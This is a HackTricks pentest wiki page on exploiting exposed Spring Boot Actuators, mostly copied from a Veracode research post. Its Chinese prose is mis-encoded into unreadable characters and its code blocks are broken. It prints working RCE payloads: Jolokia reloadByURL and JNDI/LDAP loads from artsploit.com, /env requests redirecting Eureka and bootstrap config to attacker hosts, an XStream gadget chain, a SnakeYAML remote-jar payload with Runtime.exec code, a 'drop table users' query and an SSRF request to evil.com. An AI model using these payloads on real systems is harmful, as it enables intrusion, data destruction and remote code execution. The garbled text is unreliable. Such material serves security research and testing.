# Spring Actuators

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**æ¥è‡ª** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## åˆ©ç”¨Spring Boot Actuators

**å¤åˆ¶è‡ª** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Spring Bootæ¡†æ¶åŒ…æ‹¬ä¸€äº›ç§°ä¸ºactuatorsçš„åŠŸèƒ½ï¼Œä»¥å¸®åŠ©æ‚¨åœ¨å°†webåº”ç”¨ç¨‹åºæ¨é€åˆ°ç”Ÿäº§ç¯å¢ƒæ—¶è¿›è¡Œç›‘æ§å’Œç®¡ç†ã€‚å®ƒä»¬æ—¨åœ¨ç”¨äºå®¡è®¡ã€å¥åº·æ£€æŸ¥å’ŒæŒ‡æ ‡æ”¶é›†ï¼Œä½†å¦‚æœé…ç½®ä¸å½“ï¼Œä¹Ÿå¯èƒ½ä¸ºæ‚¨çš„æœåŠ¡å™¨æ‰“å¼€ä¸€ä¸ªéšè—çš„é—¨ã€‚

å½“Spring Bootåº”ç”¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨å°†å‡ ä¸ªç«¯ç‚¹ï¼ˆå¦‚'/health'ã€'/trace'ã€'/beans'ã€'/env'ç­‰ï¼‰æ³¨å†Œåˆ°è·¯ç”±è¿‡ç¨‹ä¸­ã€‚å¯¹äºSpring Boot 1 - 1.4ï¼Œè¿™äº›ç«¯ç‚¹å¯ä»¥åœ¨æ²¡æœ‰è®¤è¯çš„æƒ…å†µä¸‹è®¿é—®ï¼Œå¯¼è‡´å®‰å…¨æ€§é—®é¢˜ã€‚ä»Springç‰ˆæœ¬1.5å¼€å§‹ï¼Œé™¤äº†'/health'å’Œ'/info'ä¹‹å¤–çš„æ‰€æœ‰ç«¯ç‚¹éƒ½è¢«è®¤ä¸ºæ˜¯æ•æ„Ÿçš„ï¼Œå¹¶é»˜è®¤å—åˆ°ä¿æŠ¤ï¼Œä½†åº”ç”¨ç¨‹åºå¼€å‘è€…ç»å¸¸ç¦ç”¨è¿™ç§å®‰å…¨æ€§ã€‚

ä»¥ä¸‹Actuatorç«¯ç‚¹å¯èƒ½å…·æœ‰å®‰å…¨éšæ‚£ï¼Œå¯¼è‡´æ½œåœ¨çš„æ¼æ´ï¼š

* /dump - æ˜¾ç¤ºçº¿ç¨‹è½¬å‚¨ï¼ˆåŒ…æ‹¬å †æ ˆè·Ÿè¸ªï¼‰
* /trace - æ˜¾ç¤ºæœ€è¿‘å‡ æ¡HTTPæ¶ˆæ¯ï¼ˆå¯èƒ½åŒ…æ‹¬ä¼šè¯æ ‡è¯†ç¬¦ï¼‰
* /logfile - è¾“å‡ºæ—¥å¿—æ–‡ä»¶çš„å†…å®¹
* /shutdown - å…³é—­åº”ç”¨ç¨‹åº
* /mappings - æ˜¾ç¤ºæ‰€æœ‰MVCæ§åˆ¶å™¨æ˜ å°„
* /env - æä¾›å¯¹é…ç½®ç¯å¢ƒçš„è®¿é—®
* /actuator/env
* /restart - é‡å¯åº”ç”¨ç¨‹åº
* /heapdump - ä»åº”ç”¨ç¨‹åºä½¿ç”¨çš„JVMæ„å»ºå¹¶è¿”å›å †è½¬å‚¨

å¯¹äºSpring 1xï¼Œå®ƒä»¬åœ¨æ ¹URLä¸‹æ³¨å†Œï¼Œåœ¨2xä¸­ç§»åŠ¨åˆ°äº†"/actuator/"åŸºè·¯å¾„ã€‚

**åˆ©ç”¨ï¼š**

å¤§å¤šæ•°actuatorsä»…æ”¯æŒGETè¯·æ±‚ï¼Œå¹¶ç®€å•åœ°æ­ç¤ºæ•æ„Ÿé…ç½®æ•°æ®ï¼Œä½†å…¶ä¸­å‡ ä¸ªå¯¹äºå¯»æ‰¾shellçš„äººç‰¹åˆ«æœ‰è¶£ï¼š

**1. é€šè¿‡'/jolokia'è¿œç¨‹ä»£ç æ‰§è¡Œ**

å¦‚æœJolokiaåº“åœ¨ç›®æ ‡åº”ç”¨ç¨‹åºç±»è·¯å¾„ä¸­ï¼Œå®ƒå°†è‡ªåŠ¨ç”±Spring Bootåœ¨'/jolokia' actuatorç«¯ç‚¹ä¸‹æš´éœ²ã€‚Jolokiaå…è®¸HTTPè®¿é—®æ‰€æœ‰æ³¨å†Œçš„MBeansï¼Œå¹¶è®¾è®¡ç”¨äºæ‰§è¡Œæ‚¨å¯ä»¥ä½¿ç”¨JMXæ‰§è¡Œçš„ç›¸åŒæ“ä½œã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹URLåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„MBeansæ“ä½œï¼š

[**http://127.0.0.1:8090/jolokia/list**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

åŒæ ·ï¼Œå¤§å¤šæ•°MBeansæ“ä½œåªæ˜¯æ­ç¤ºäº†ä¸€äº›ç³»ç»Ÿæ•°æ®ï¼Œä½†æœ‰ä¸€ä¸ªç‰¹åˆ«æœ‰è¶£ï¼š

![reloadByURL](https://www.veracode.com/sites/default/files/exploiting_spring_boot_actuators_jolokia.png)

'**reloadByURL**'æ“ä½œï¼Œç”±Logbackåº“æä¾›ï¼Œå…è®¸æˆ‘ä»¬ä»å¤–éƒ¨URLé‡æ–°åŠ è½½æ—¥å¿—é…ç½®ã€‚åªéœ€å¯¼èˆªåˆ°ï¼š[**http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

é‚£ä¹ˆï¼Œæˆ‘ä»¬ä¸ºä»€ä¹ˆè¦å…³å¿ƒæ—¥å¿—é…ç½®å‘¢ï¼Ÿä¸»è¦æ˜¯å› ä¸ºä¸¤ä¸ªåŸå› ï¼š

1. é…ç½®å…·æœ‰XMLæ ¼å¼ï¼Œå½“ç„¶ï¼ŒLogbackåœ¨å¯ç”¨å¤–éƒ¨å®ä½“çš„æƒ…å†µä¸‹è§£æå®ƒï¼Œå› æ­¤å®ƒå®¹æ˜“å—åˆ°ç›²XXEçš„æ”»å‡»ã€‚
2. Logbacké…ç½®å…·æœ‰['ä»JNDIè·å–å˜é‡'](https://logback.qos.ch/manual/configuration.html#insertFromJNDI)çš„åŠŸèƒ½ã€‚åœ¨XMLæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åŒ…å«ä¸€ä¸ªæ ‡ç­¾ï¼Œå¦‚'**\<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName" />**'ï¼Œnameå±æ€§å°†ä¼ é€’ç»™DirContext.lookup()æ–¹æ³•ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥å‘.lookup()å‡½æ•°æä¾›ä»»æ„åç§°ï¼Œæˆ‘ä»¬ç”šè‡³ä¸éœ€è¦XXEæˆ–HeapDumpï¼Œå› ä¸ºå®ƒä¸ºæˆ‘ä»¬æä¾›äº†å®Œæ•´çš„**è¿œç¨‹ä»£ç æ‰§è¡Œ**ã€‚

**å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼š**

1\. æ”»å‡»è€…è¯·æ±‚ä¸Šè¿°URLä»¥æ‰§è¡Œ'qos.logback.classic.jmx.JMXConfigurator'ç±»æä¾›çš„'reloadByURL'å‡½æ•°ã€‚

2\. 'reloadByURL'å‡½æ•°ä»[http://artsploit.com/logback.xml](http://artsploit.com/logback.xml)ä¸‹è½½æ–°é…ç½®å¹¶å°†å…¶è§£æä¸ºLogbacké…ç½®ã€‚è¿™ä¸ªæ¶æ„é…ç½®åº”è¯¥åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š
```
<configuration>
<insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3\. å½“è¿™ä¸ªæ–‡ä»¶åœ¨æ˜“å—æ”»å‡»çš„æœåŠ¡å™¨ä¸Šè¢«è§£ææ—¶ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªè¿æ¥åˆ°æ”»å‡»è€…æ§åˆ¶çš„LDAPæœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨åœ¨â€œenv-entry-nameâ€å‚æ•°å€¼ä¸­æŒ‡å®šï¼Œè¿™å¯¼è‡´JNDIè§£æã€‚æ¶æ„LDAPæœåŠ¡å™¨å¯èƒ½ä¼šè¿”å›ä¸€ä¸ªå¸¦æœ‰'Reference'ç±»å‹çš„å¯¹è±¡ï¼Œä»¥è§¦å‘**åœ¨ç›®æ ‡åº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œæä¾›çš„å­—èŠ‚ç **ã€‚JNDIæ”»å‡»åœ¨è¿™ç¯‡[MicroFocusç ”ç©¶è®ºæ–‡](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)ä¸­æœ‰å¾ˆå¥½çš„è§£é‡Šã€‚[æ–°çš„JNDIåˆ©ç”¨æŠ€æœ¯](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)ï¼ˆä¹‹å‰åœ¨æˆ‘ä»¬çš„åšå®¢ä¸­æè¿°è¿‡ï¼‰ä¹ŸåŒæ ·é€‚ç”¨äºæ­¤ï¼Œå› ä¸ºTomcatæ˜¯Spring Bootæ¡†æ¶ä¸­é»˜è®¤çš„åº”ç”¨æœåŠ¡å™¨ã€‚

**2. é€šè¿‡'/env'ä¿®æ”¹é…ç½®**

å¦‚æœSpring Cloud Librariesåœ¨ç±»è·¯å¾„ä¸­ï¼Œ**'/env'**ç«¯ç‚¹å…è®¸ä½ ä¿®æ”¹Springç¯å¢ƒå±æ€§ã€‚æ‰€æœ‰æ ‡æ³¨ä¸º'**@ConfigurationProperties**'çš„beanséƒ½å¯ä»¥è¢«ä¿®æ”¹å’Œé‡æ–°ç»‘å®šã€‚æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„è®¸å¤šå±æ€§ï¼ˆä½†ä¸æ˜¯å…¨éƒ¨ï¼‰éƒ½åˆ—åœ¨äº†'/configprops' actuatorç«¯ç‚¹ä¸Šã€‚å®é™…ä¸Šï¼Œæœ‰å¾ˆå¤šè¿™æ ·çš„å±æ€§ï¼Œä½†å®Œå…¨ä¸æ¸…æ¥šæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä»€ä¹ˆæ‰èƒ½è¾¾åˆ°æŸç§æ•ˆæœã€‚åœ¨èŠ±äº†å‡ å¤©æ—¶é—´ç©å¼„å®ƒä»¬ä¹‹åï¼Œæˆ‘ä»¬å‘ç°äº†è¿™ä¸ªï¼š
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
æ­¤å±æ€§å°† Eureka serviceURL ä¿®æ”¹ä¸ºä»»æ„å€¼ã€‚Eureka Server é€šå¸¸ç”¨ä½œå‘ç°æœåŠ¡å™¨ï¼Œå‡ ä¹æ‰€æœ‰ Spring Cloud åº”ç”¨ç¨‹åºéƒ½åœ¨å…¶ä¸Šæ³¨å†Œå¹¶å‘å…¶å‘é€çŠ¶æ€æ›´æ–°ã€‚å¦‚æœæ‚¨å¹¸è¿åœ°åœ¨ç›®æ ‡ç±»è·¯å¾„ä¸­æœ‰ Eureka-Client <1.8.7ï¼ˆé€šå¸¸åŒ…å«åœ¨ Spring Cloud Netflix ä¸­ï¼‰ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨å…¶ä¸­çš„ **XStream ååºåˆ—åŒ–æ¼æ´**ã€‚æ‚¨éœ€è¦åšçš„å°±æ˜¯é€šè¿‡ '/env' å°† 'eureka.client.serviceUrl.defaultZone' å±æ€§è®¾ç½®ä¸ºæ‚¨çš„æœåŠ¡å™¨ URLï¼ˆ[http://artsploit.com/n/xstream](http://artsploit.com/n/xstream)ï¼‰ï¼Œç„¶åè°ƒç”¨ '/refresh' ç«¯ç‚¹ã€‚ä¹‹åï¼Œæ‚¨çš„æœåŠ¡å™¨åº”è¯¥æä¾›åŒ…å«ä»¥ä¸‹å†…å®¹çš„ XStream æœ‰æ•ˆè½½è·ï¼š
```markup
<linked-hash-set>
<jdk.nashorn.internal.objects.NativeString>
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
<dataHandler>
<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
<is class="javax.crypto.CipherInputStream">
<cipher class="javax.crypto.NullCipher">
<serviceIterator class="javax.imageio.spi.FilterIterator">
<iter class="javax.imageio.spi.FilterIterator">
<iter class="java.util.Collections$EmptyIterator"/>
<next class="java.lang.ProcessBuilder">
<command>
<string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
</command>
<redirectErrorStream>false</redirectErrorStream>
</next>
</iter>
<filter class="javax.imageio.ImageIO$ContainsFilter">
<method>
<class>java.lang.ProcessBuilder</class>
<name>start</name>
<parameter-types/>
</method>
<name>foo</name>
</filter>
<next class="string">foo</next>
</serviceIterator>
<lock/>
</cipher>
<input class="java.lang.ProcessBuilder$NullInputStream"/>
<ibuffer></ibuffer>
</is>
</dataSource>
</dataHandler>
</value>
</jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>
```
```markdown
æ­¤XStreamæœ‰æ•ˆè½½è·æ˜¯ä»[Marshalsec research](https://github.com/mbechler/marshalsec)ä¸­çš„ImageIO JDK-only gadget chainç•¥ä½œä¿®æ”¹çš„ç‰ˆæœ¬ã€‚å”¯ä¸€çš„åŒºåˆ«åœ¨äºä½¿ç”¨**LinkedHashSet**æ¥è§¦å‘'jdk.nashorn.internal.objects.NativeString.hashCode()'æ–¹æ³•ã€‚åŸå§‹æœ‰æ•ˆè½½è·åˆ©ç”¨java.lang.Mapæ¥å®ç°ç›¸åŒçš„è¡Œä¸ºï¼Œä½†æ˜¯Eurekaçš„XStreamé…ç½®æœ‰ä¸€ä¸ª[è‡ªå®šä¹‰çš„æ˜ å°„è½¬æ¢å™¨](https://github.com/Netflix/eureka/blob/master/eureka-client/src/main/java/com/netflix/discovery/converters/XmlXStream.java#L58)ï¼Œè¿™ä½¿å¾—å®ƒä¸å¯ç”¨ã€‚ä¸Šé¢çš„æœ‰æ•ˆè½½è·æ ¹æœ¬ä¸ä½¿ç”¨Mapsï¼Œå¯ä»¥ç”¨æ¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œæ— éœ€é¢å¤–é™åˆ¶ã€‚

ä½¿ç”¨Spring Actuatorsï¼Œå³ä½¿ä½ æ²¡æœ‰è®¿é—®å†…éƒ¨EurekaæœåŠ¡å™¨çš„æƒé™ï¼Œä½ ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼›ä½ åªéœ€è¦ä¸€ä¸ªå¯ç”¨çš„"/env"ç«¯ç‚¹ã€‚

**å…¶ä»–æœ‰ç”¨çš„è®¾ç½®ï¼š**

**spring.datasource.tomcat.validationQuery=drop+table+users** - å…è®¸ä½ æŒ‡å®šä»»ä½•SQLæŸ¥è¯¢ï¼Œå®ƒå°†è‡ªåŠ¨é’ˆå¯¹å½“å‰æ•°æ®åº“æ‰§è¡Œã€‚å®ƒå¯ä»¥æ˜¯ä»»ä½•è¯­å¥ï¼ŒåŒ…æ‹¬insertã€updateæˆ–deleteã€‚

![Exploiting Spring Boot Actuators Drop Table](https://www.veracode.com/sites/default/files/exploiting_spring_boot_actuators_drop_table.png)

**spring.datasource.tomcat.url**=jdbc:hsqldb:[https://localhost:3002/xdb](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - å…è®¸ä½ ä¿®æ”¹å½“å‰çš„JDBCè¿æ¥å­—ç¬¦ä¸²ã€‚

æœ€åä¸€ä¸ªçœ‹èµ·æ¥å¾ˆæ£’ï¼Œä½†é—®é¢˜æ˜¯å½“è¿è¡Œæ•°æ®åº“è¿æ¥çš„åº”ç”¨ç¨‹åºå·²ç»å»ºç«‹æ—¶ï¼Œä»…ä»…æ›´æ–°JDBCå­—ç¬¦ä¸²å¹¶æ²¡æœ‰ä»»ä½•æ•ˆæœã€‚å¹¸è¿çš„æ˜¯ï¼Œè¿˜æœ‰å¦ä¸€ä¸ªå±æ€§å¯èƒ½åœ¨è¿™ç§æƒ…å†µä¸‹å¸®åŠ©æˆ‘ä»¬ï¼š

**spring.datasource.tomcat.max-active**=777

æˆ‘ä»¬å¯ä»¥ä½¿ç”¨çš„æŠ€å·§æ˜¯å¢åŠ æ•°æ®åº“çš„åŒæ—¶è¿æ¥æ•°ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹JDBCè¿æ¥å­—ç¬¦ä¸²ï¼Œå¢åŠ è¿æ¥æ•°ï¼Œç„¶åå‘åº”ç”¨ç¨‹åºå‘é€è®¸å¤šè¯·æ±‚ä»¥æ¨¡æ‹Ÿé‡è´Ÿè½½ã€‚åœ¨è´Ÿè½½ä¸‹ï¼Œåº”ç”¨ç¨‹åºå°†åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“è¿æ¥ï¼Œä½¿ç”¨æ›´æ–°çš„æ¶æ„JDBCå­—ç¬¦ä¸²ã€‚æˆ‘åœ¨æœ¬åœ°é’ˆå¯¹Mysqlæµ‹è¯•äº†è¿™ç§æŠ€æœ¯ï¼Œæ•ˆæœéå¸¸å¥½ã€‚

![Exploiting Spring Boot Actuators Max Active](https://www.veracode.com/sites/default/files/exploiting_spring_boot_actuators_max_active.png)

é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å…¶ä»–çœ‹èµ·æ¥æœ‰è¶£çš„å±æ€§ï¼Œä½†å®é™…ä¸Šå¹¶ä¸çœŸæ­£æœ‰ç”¨ï¼š

**spring.datasource.url** - æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼ˆä»…ç”¨äºç¬¬ä¸€æ¬¡è¿æ¥ï¼‰

**spring.datasource.jndiName** - æ•°æ®åº“JNDIå­—ç¬¦ä¸²ï¼ˆä»…ç”¨äºç¬¬ä¸€æ¬¡è¿æ¥ï¼‰

**spring.datasource.tomcat.dataSourceJNDI** - æ•°æ®åº“JNDIå­—ç¬¦ä¸²ï¼ˆæ ¹æœ¬ä¸ä½¿ç”¨ï¼‰

**spring.cloud.config.uri**=[http://artsploit.com/](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - spring cloud config urlï¼ˆåº”ç”¨å¯åŠ¨åæ²¡æœ‰ä»»ä½•æ•ˆæœï¼Œåªä½¿ç”¨åˆå§‹å€¼ã€‚ï¼‰

è¿™äº›å±æ€§é™¤éè°ƒç”¨'/restart'ç«¯ç‚¹ï¼Œå¦åˆ™ä¸ä¼šæœ‰ä»»ä½•æ•ˆæœã€‚è¿™ä¸ªç«¯ç‚¹ä¼šé‡å¯æ‰€æœ‰ApplicationContextï¼Œä½†é»˜è®¤æƒ…å†µä¸‹æ˜¯ç¦ç”¨çš„ã€‚

è¿˜æœ‰å¾ˆå¤šå…¶ä»–æœ‰è¶£çš„å±æ€§ï¼Œä½†å¤§å¤šæ•°åœ¨æ›´æ”¹åä¸ä¼šç«‹å³ç”Ÿæ•ˆã€‚

**æ³¨æ„** åœ¨Spring Boot 2xä¸­ï¼Œé€šè¿‡'/env'ç«¯ç‚¹ä¿®æ”¹å±æ€§çš„è¯·æ±‚æ ¼å¼ç•¥æœ‰ä¸åŒï¼ˆå®ƒä½¿ç”¨jsonæ ¼å¼ï¼‰ï¼Œä½†æ€è·¯æ˜¯ç›¸åŒçš„ã€‚

**ä¸€ä¸ªæ˜“å—æ”»å‡»çš„åº”ç”¨ç¤ºä¾‹ï¼š**

å¦‚æœä½ æƒ³åœ¨æœ¬åœ°æµ‹è¯•è¿™ä¸ªæ¼æ´ï¼Œæˆ‘åœ¨æˆ‘çš„Githubé¡µé¢ä¸Šåˆ›å»ºäº†ä¸€ä¸ª[ç®€å•çš„Spring Bootåº”ç”¨ç¨‹åº](https://github.com/artsploit/actuator-testbed)ã€‚æ‰€æœ‰æœ‰æ•ˆè½½è·éƒ½åº”è¯¥åœ¨é‚£é‡Œå·¥ä½œï¼Œé™¤äº†æ•°æ®åº“è®¾ç½®ï¼ˆé™¤éä½ é…ç½®å®ƒï¼‰ã€‚

**é»‘ç›’å‘ç°ï¼š**

é»˜è®¤actuatorsçš„å®Œæ•´åˆ—è¡¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ï¼š[https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)ã€‚è¯·è®°ä½ï¼Œåº”ç”¨ç¨‹åºå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨@Endpointæ³¨è§£åˆ›å»ºè‡ªå·±çš„ç«¯ç‚¹ã€‚

**2019å¹´5æœˆæ›´æ–°ï¼š**

é€šè¿‡Springç¯å¢ƒå±æ€§ä¿®æ”¹ï¼Œæœ‰ä¸€ç§æ›´å¯é çš„æ–¹æ³•æ¥å®ç°RCEï¼š
```
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml
```
æ­¤è¯·æ±‚ä¿®æ”¹äº† 'spring.cloud.bootstrap.location' å±æ€§ï¼Œè¯¥å±æ€§ç”¨äºåŠ è½½å¤–éƒ¨é…ç½®å¹¶ä»¥ YAML æ ¼å¼è§£æå®ƒã€‚ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è°ƒç”¨ '/refresh' ç«¯ç‚¹ã€‚
```
POST /refresh HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
```markdown
å½“ä»è¿œç¨‹æœåŠ¡å™¨è·å– YAML é…ç½®æ—¶ï¼Œå®ƒä¼šä½¿ç”¨ SnakeYAML åº“è¿›è¡Œè§£æï¼Œè¯¥åº“ä¹Ÿå®¹æ˜“å—åˆ°ååºåˆ—åŒ–æ”»å‡»ã€‚æœ‰æ•ˆè½½è·ï¼ˆyaml-payload.ymlï¼‰å¯ä»¥ä½¿ç”¨ä¸Šè¿° Marshalsec ç ”ç©¶ç”Ÿæˆï¼š
```
```
!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
]]
]
```
ååºåˆ—åŒ–æ­¤æ–‡ä»¶ä¼šè§¦å‘ä½¿ç”¨æä¾›çš„URLClassLoaderæ‰§è¡ŒScriptEngineManagerçš„æ„é€ å‡½æ•°ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå®ƒä¼šå¯¼è‡´**'java.util.ServiceLoader#load(java.lang.Class\<S>, java.lang.ClassLoader)'** æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°è¯•åœ¨ç±»è·¯å¾„ä¸­çš„æ‰€æœ‰åº“ä¸­æ‰¾åˆ°'ScriptEngineFactory'æ¥å£çš„æ‰€æœ‰å®ç°ã€‚ç”±äºæˆ‘ä»¬å¯ä»¥é€šè¿‡URLClassLoaderæ·»åŠ æ–°åº“ï¼Œæˆ‘ä»¬å¯ä»¥æä¾›ä¸€ä¸ªåŒ…å«æ¶æ„å­—èŠ‚ç çš„æ–°'ScriptEngineFactory'ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«ä»¥ä¸‹å¿…é¡»æ–‡ä»¶çš„jarå­˜æ¡£ï¼š[yaml-payload.jar:/artsploit/AwesomeScriptEngineFactory.class](https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java) åº”è¯¥åŒ…å«å®é™…çš„å­—èŠ‚ç ï¼Œæ„é€ å‡½æ•°ä¸­æœ‰æ¶æ„è½½è·ã€‚
```
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

public AwesomeScriptEngineFactory() {
try {
Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
} catch (IOException e) {
e.printStackTrace();
}
}
```
```markdown
[yaml-payload.jar:/META-INF/services/javax.script.ScriptEngineFactory](https://github.com/artsploit/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory) åº”è¯¥åªæ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ŒåŒ…å«å¯¹ 'artsploit.AwesomeScriptEngineFactory' çš„å®Œæ•´å¼•ç”¨ï¼Œä»¥ä¾¿ ServiceLoader çŸ¥é“åœ¨å“ªé‡Œæ‰¾åˆ°ç±»ï¼š**artsploit.AwesomeScriptEngineFactory** åŒæ ·ï¼Œè¿™ç§åˆ©ç”¨æŠ€æœ¯éœ€è¦ spring cloud åœ¨ç±»è·¯å¾„ä¸­ï¼Œä½†ä¸ Eureka çš„ XStream payload ç›¸æ¯”ï¼Œå®ƒå³ä½¿åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­ä¹Ÿèƒ½å·¥ä½œã€‚ä½ å¯ä»¥åœ¨æˆ‘çš„ github é¡¹ç›®ä¸­æ‰¾åˆ°å®Œæ•´çš„ payloadï¼š[yaml-payload](https://github.com/artsploit/yaml-payload)ã€‚

## Env + H2 RCE

æŸ¥çœ‹æ­¤é¡µé¢ä»¥äº†è§£å¦‚ä½•åˆ©ç”¨ /env + H2 ç»„åˆï¼š[https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

## é€šè¿‡é”™è¯¯çš„è·¯å¾„åè§£é‡Šåœ¨ Spring Boot ä¸Šçš„ SSRF <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

[**æ¥è‡ªè¿™é¡¹ç ”ç©¶**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation)ï¼šSpring æ¡†æ¶æ¥å—çŸ©é˜µå‚æ•°åˆ†éš”ç¬¦ `;` åœ¨ HTTP è·¯å¾„åçš„ç¬¬ä¸€ä¸ªæ–œæ ä¹‹å‰ï¼š
```
```http
GET ;1337/api/v1/me HTTP/1.1
Host: target.com
Connection: close
```
åœ¨å¦‚ä¸‹åœºæ™¯ä¸­ï¼š

<figure><img src="../../.gitbook/assets/image (717).png" alt="" width="563"><figcaption></figcaption></figure>

è€ƒè™‘åˆ°Springå…è®¸åœ¨çŸ©é˜µå‚æ•°åˆ†éš”ç¬¦åé¢è·Ÿä»»ä½•å­—ç¬¦ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ä½¿ç”¨`@`å­—ç¬¦æ¥è·å–ä»»æ„ç«¯ç‚¹ã€‚

ä»¥ä¸‹æ˜¯åˆ©ç”¨è¯·æ±‚çš„ç¤ºä¾‹ï¼š
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
## æ›´å¤šä¿¡æ¯

* [https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html](https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html)
* [https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators](https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators)
* [https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep](https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep)

<details>

